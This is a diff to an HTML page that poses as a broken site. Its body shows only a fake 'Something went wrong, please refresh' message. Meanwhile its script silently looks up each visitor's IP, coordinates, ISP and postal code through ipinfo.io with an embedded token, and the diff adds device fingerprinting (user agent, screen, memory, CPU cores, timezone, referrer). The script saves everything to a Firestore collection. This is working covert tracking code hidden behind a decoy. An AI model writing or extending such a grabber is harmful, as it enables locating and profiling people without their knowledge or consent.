@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Home Page</title>
+    <title>Save User Location</title>
     <script type="module">
         // Import Firebase v9+ (Modular)
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
@@ -24,7 +24,27 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // Fetch User IP & Location
+
+        // Function to get device & browser info
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                deviceMemory: navigator.deviceMemory || "Unknown", // RAM (in GB)
+                hardwareConcurrency: navigator.hardwareConcurrency || "Unknown", // CPU Cores
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                onlineStatus: navigator.onLine,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer,
+                pageURL: window.location.href
+            };
+        }
+
+        // Fetch Public IP & Location Data
         fetch('https://ipinfo.io/json?token=6a9008bb55fd89')
             .then(response => response.json())
             .then(async (data) => {
@@ -35,12 +55,15 @@
                     country: data.country,
                     location: data.loc, // Latitude, Longitude
                     org: data.org, // ISP Information
+                    postal: data.postal || "Unknown",
+                    timezone: data.timezone || "Unknown",
+                    device: getDeviceInfo(),
                     timestamp: new Date()
                 };
 
                 try {
                     await addDoc(collection(db, "user_locations"), userInfo);
-                    console.log("✅saved successfully!");
+                    console.log("✅Saved successfully!");
                 } catch (error) {
                     console.error("❌ Error saving:", error);
                 }
@@ -49,6 +72,6 @@
     </script>
 </head>
 <body>
-    <h2>Something went wrong, Please refresh page.</h2>
+    <h2>Something went wrong, Please refresh the page.....</h2>
 </body>
 </html>
